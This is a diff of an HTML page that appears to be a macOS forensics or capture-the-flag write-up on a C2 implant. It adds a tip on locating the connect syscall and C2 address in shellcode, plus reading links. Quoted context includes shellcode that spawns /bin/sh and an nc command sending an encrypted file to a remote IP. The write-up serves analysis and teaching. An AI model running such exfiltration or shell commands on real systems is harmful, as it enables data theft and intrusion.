@@ -1094,6 +1094,17 @@ Wrote 17204 bytes to extracted\updatesvc from vnode at address ffffff802867c780<
              mov eax, 0x200003b    ; macOS BSD syscall: execve
              syscall               ; execve("/bin/sh") interactive shell</code></pre>
 
+              <blockquote>
+                <strong>How to approach reversing unknown shellcode:</strong> before you start blindly reversing and make life harder for yourself, approach it with the DFIR context. we already know this is a C2 implant, which means it has to open a socket and connect back to the attacker. so instead of reading the whole binary top to bottom, just grep the raw bytes for the connect syscall. on macOS, BSD syscalls follow a fixed numbering scheme, <code>connect</code> is always <code>0x2000062</code>, which encodes as <code>B8 62 00 00 02</code> in machine code. search for those five bytes and you land directly on the connect call. once you're there, the next instructions can be guessed with context, the <code>movabs rsi</code> right after it is where the C2 address lives, loading a packed <code>sockaddr_in</code> struct as a 64-bit immediate, 2 bytes for address family, 2 bytes for port, 4 bytes for IP.
+              </blockquote>
+
+              <p>there is no universal approach to shellcode reversing. some resources that helped:</p>
+              <ul>
+                <li><a href="https://github.com/PaloAltoNetworks/Unit42-Threat-Intelligence-Article-Information/blob/main/Mega-Malware-Analysis-Tutorial-Featuring-Donut.pdf" target="_blank">Mega Malware Analysis Tutorial Featuring Donut - Unit42</a></li>
+                <li><a href="https://www.0ffset.net/reverse-engineering/common-shellcode-techniques/" target="_blank">Common Shellcode Techniques - 0ffset</a></li>
+                <li><a href="https://blog.intellibron.io/understanding-shellcode/" target="_blank">Understanding Shellcode - intellibron</a></li>
+              </ul>
+
               <h4>Raw bytes confirm IP and port</h4>
               <div class="img-container">
                 <img src="photos-s4nct1m0ny/qsn10-8.png" alt="Raw hex dump - sockaddr_in bytes highlighted" />
@@ -1255,6 +1266,9 @@ cat /tmp/pics.enc | nc 192.168.25.3 9999</code></pre>
                 <li><a href="https://cugu.github.io/awesome-forensics/">Awesome Forensics - cugu</a></li>
                 <li><a href="https://www.cyberdefensemagazine.com/forensic-collections-from-a-mac-challenges-solutions/">Forensic Collections from a Mac: Challenges &amp; Solutions - Cyber Defense Magazine</a></li>
                 <li><a href="https://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_workshop_macOS-forensic_en.pdf">macOS Forensics Workshop - JSAC 2022 / JPCERT</a></li>
+                <li><a href="https://github.com/PaloAltoNetworks/Unit42-Threat-Intelligence-Article-Information/blob/main/Mega-Malware-Analysis-Tutorial-Featuring-Donut.pdf" target="_blank">Mega Malware Analysis Tutorial Featuring Donut - Unit42</a></li>
+                <li><a href="https://www.0ffset.net/reverse-engineering/common-shellcode-techniques/" target="_blank">Common Shellcode Techniques - 0ffset</a></li>
+                <li><a href="https://blog.intellibron.io/understanding-shellcode/" target="_blank">Understanding Shellcode - intellibron</a></li>
               </ul>
 
               <hr />
